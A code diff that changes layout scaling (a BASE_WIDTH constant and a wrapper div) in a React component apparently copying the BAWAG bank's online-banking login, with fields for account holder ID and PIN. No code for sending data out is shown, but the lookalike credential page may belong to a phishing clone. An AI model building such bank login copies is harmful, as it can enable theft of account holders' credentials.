@@ -57,6 +57,8 @@ const translations: Record<Lang, {
   },
 };
 
+const BASE_WIDTH = 970;
+
 const Bawag = () => {
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
@@ -67,7 +69,7 @@ const Bawag = () => {
   const [contentHeight, setContentHeight] = useState(0);
 
   const updateScale = useCallback(() => {
-    const s = Math.min(1, window.innerWidth / 970);
+    const s = Math.min(1, window.innerWidth / BASE_WIDTH);
     setScale(s);
   }, []);
 
@@ -87,22 +89,25 @@ const Bawag = () => {
   const now = new Date();
   const dateStr = `${t.days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()}, ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
 
+  const scaledWidth = BASE_WIDTH * scale;
+  const scaledHeight = contentHeight ? contentHeight * scale : undefined;
+
   return (
     <div
       className="min-h-screen bg-white overflow-x-hidden flex justify-center"
       style={{
         fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
-        height: scale < 1 && contentHeight ? `${contentHeight * scale}px` : undefined,
       }}
     >
-      <div
-        ref={contentRef}
-        style={{
-          width: '970px',
-          transform: `scale(${scale})`,
-          transformOrigin: 'top left',
-        }}
-      >
+      <div style={{ width: `${scaledWidth}px`, height: scaledHeight ? `${scaledHeight}px` : undefined }}>
+        <div
+          ref={contentRef}
+          style={{
+            width: `${BASE_WIDTH}px`,
+            transform: `scale(${scale})`,
+            transformOrigin: 'top left',
+          }}
+        >
       
         {/* Header */}
         <header className="bg-white border-b border-gray-200 px-4 py-2 flex items-center justify-between">
